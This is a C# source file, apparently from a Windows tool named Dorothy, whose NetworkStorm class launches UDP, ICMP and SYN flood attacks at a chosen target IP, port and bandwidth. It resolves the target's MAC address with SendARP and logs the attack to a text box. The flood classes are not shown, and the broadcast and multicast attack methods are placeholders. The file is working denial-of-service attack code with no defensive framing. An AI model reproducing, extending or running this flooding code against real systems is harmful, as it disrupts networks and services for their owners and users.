using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;

namespace Dorothy.Models
{
    public class NetworkStorm
    {
        private readonly AttackLogger _logger;
        private readonly TextBox _logArea;
        private bool _isAttackRunning;
        private CancellationTokenSource? _cancellationSource;
        public string SourceIp { get; private set; }
        public byte[] SourceMac { get; private set; }
        public bool EnableLogging { get; set; }

        public NetworkStorm(TextBox logArea)
        {
            _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
            _logger = new AttackLogger(logArea);
            SourceIp = string.Empty;
            SourceMac = Array.Empty<byte>();
        }

        public void SetSourceInfo(string sourceIp, byte[] sourceMac)
        {
            SourceIp = sourceIp;
            SourceMac = sourceMac;
        }

        private void Log(string message)
        {
            _logger.LogInfo(message);
        }

        public async Task StartAttackAsync(AttackType attackType, string targetIp, int targetPort, long megabitsPerSecond)
        {
            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SourceIp) || SourceMac.Length != 6)
            {
                _logger.LogError("Source IP or MAC is not set. Cannot start attack.");
                throw new Exception("Source IP or MAC is not set.");
            }

            _cancellationSource = new CancellationTokenSource();
            _isAttackRunning = true;

            byte[] targetMac = await GetMacAddressAsync(targetIp);
            _logger.StartAttack(attackType, SourceIp, SourceMac, targetIp, targetMac, megabitsPerSecond);
            try
            {
                switch (attackType)
                {
                    case AttackType.UdpFlood:
                        using (var udpFlood = new UdpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await udpFlood.StartAsync();
                        }
                        break;
                    case AttackType.IcmpFlood:
                        using (var icmpFlood = new IcmpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await icmpFlood.StartAsync();
                        }
                        break;
                    case AttackType.SynFlood:
                        using (var tcpFlood = new TcpFlood(
                            SourceIp,
                            SourceMac,
                            targetIp,
                            targetMac,
                            targetPort,
                            megabitsPerSecond * 125_000,
                            _cancellationSource.Token))
                        {
                            await tcpFlood.StartAsync();
                        }
                        break;
                    default:
                        Log("Unknown Attack Type.");
                        break;
                }

                Log("Attack finished successfully.");
            }
            catch (Exception ex)
            {
                _logger.LogError($"Attack failed: {ex.Message}");
            }
            finally
            {
                _isAttackRunning = false;
                _cancellationSource?.Dispose();
            }
        }

        public async Task StopAttackAsync()
        {
            if (!_isAttackRunning)
            {
                _logger.LogWarning("No attack is currently running.");
                return;
            }

            try
            {
                _logger.LogInfo("Stopping attack...");
                _cancellationSource?.Cancel();
                _isAttackRunning = false;
                await Task.CompletedTask;
                _logger.LogInfo("Attack stop signal sent.");
            }
            finally
            {
                _cancellationSource?.Dispose();
                _cancellationSource = null;
            }
        }

        public async Task<byte[]> GetMacAddressAsync(string ipAddress)
        {
            return await Task.Run(() =>
            {
                try
                {
                    var targetAddr = BitConverter.ToInt32(IPAddress.Parse(ipAddress).GetAddressBytes(), 0);
                    var srcAddr = BitConverter.ToInt32(IPAddress.Parse(SourceIp).GetAddressBytes(), 0);
                    var macAddr = new byte[6];
                    var macAddrLen = (uint)macAddr.Length;
                    
                    var result = SendARP(targetAddr, srcAddr, macAddr, ref macAddrLen);
                    
                    if (result != 0)
                    {
                        throw new Exception($"Failed to get MAC address. Error code: {result}");
                    }

                    return macAddr;
                }
                catch (Exception ex)
                {
                    _logger.LogError("Failed to get MAC address.");
                    throw;
                }
            });
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint macAddrLen);

        public async Task StartBroadcastAttackAsync(string targetIp, int targetPort, long megabitsPerSecond)
        {
            // Placeholder for broadcast attack implementation
            _logger.LogInfo($"Starting broadcast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {megabitsPerSecond}Mbps");
            await Task.CompletedTask;
        }

        public async Task StartMulticastAttackAsync(string targetIp, int targetPort, long megabitsPerSecond)
        {
            // Placeholder for multicast attack implementation
            _logger.LogInfo($"Starting multicast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {megabitsPerSecond}Mbps");
            await Task.CompletedTask;
        }
    }
}
